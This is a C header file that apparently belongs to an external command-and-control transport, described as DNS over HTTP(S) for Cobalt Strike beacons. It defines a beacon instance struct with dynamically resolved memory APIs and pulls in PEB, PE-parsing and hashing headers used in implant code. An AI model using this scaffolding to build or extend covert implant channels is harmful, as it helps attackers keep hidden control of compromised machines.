/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#include <windows.h>
#include <ntstatus.h>

#include "macros.h"
#include "beacon.h"
#include "hashes.h"

typedef struct
{
	ULONG Id;

	struct
	{
		FUNC( LocalSize );
		FUNC( LocalFree );
		FUNC( LocalAlloc );
	} api;

} BEACON_INSTANCE, *PBEACON_INSTANCE;

#include "tebpeb.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"
